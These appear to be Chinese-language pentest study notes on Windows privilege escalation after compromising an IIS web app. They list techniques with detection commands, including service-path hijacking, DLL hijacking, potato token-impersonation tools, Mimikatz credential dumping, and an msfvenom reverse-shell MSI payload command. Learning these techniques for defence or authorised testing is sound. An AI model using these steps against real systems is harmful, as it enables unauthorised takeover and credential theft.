# Windows提权 Web应用部署在Windows系统中： Web套件 IIS，权限较低，需要提权 ## 操作系统漏洞提权 Windows操作系统本身存在权限漏洞，如果没有补丁，就意味着漏洞存在 ### 补丁与漏洞对照表 ### 查看系统补丁 ### 远程登陆 防火墙状态相关命令： 开启RDP 启用Guest用户 ## 数据库提权 核心思路： 需要最高权限数据库账户 利用数据库执行系统命令 ### MySQL提权 考虑因素： ### 1. 服务配置错误 - Unquoted Service Path - 原理：服务路径含空格且未加引号，可劫持前缀路径 - 检测：`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"` - 利用：在路径前段放置同名 exe - 可修改服务二进制 - 检测：`accesschk.exe -ucqv "服务名"`（Sysinternals） - 利用：替换为 msfvenom 生成的 payload ### 2. DLL 劫持 - 应用加载 DLL 时未指定完整路径，优先从当前目录加载 - 检测：Process Monitor 监控 DLL 加载路径 - 利用：放置恶意 DLL 到可写目录 ### 3. 特权令牌滥用（Token Impersonation） - SeImpersonatePrivilege / SeAssignPrimaryPrivilege - 工具：`JuicyPotato`, `PrintSpoofer`, `RoguePotato` - 前提：拥有对应特权（`whoami /priv` 查看） ### 4. AlwaysInstallElevated - 组策略允许低权限用户以 SYSTEM 安装 MSI - 检测：`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` - 利用：`msfvenom -p windows/x64/shell_reverse_tcp -f msi -o evil.msi` ### 5. 计划任务滥用 - 可修改的 .xml 任务文件或可写任务脚本 - 检测：`schtasks /query /fo LIST /v`，`icacls C:\Windows\System32\Tasks\*` ### 6. 内核漏洞 - 如 MS17-010（本地提权变种）、CVE-2021-34527（PrintNightmare） - 检测：`systeminfo` → 查补丁 → 使用 `Windows Exploit Suggester` ### 7. 凭证窃取 - **Mimikatz**：抓取 LSASS 中明文密码、Hash、Ticket - **注册表/配置文件**：如 AutoLogon 密码、RDP 凭证 - **PowerShell 历史**：`Get-Content (Get-PSReadlineOption).HistorySavePath`
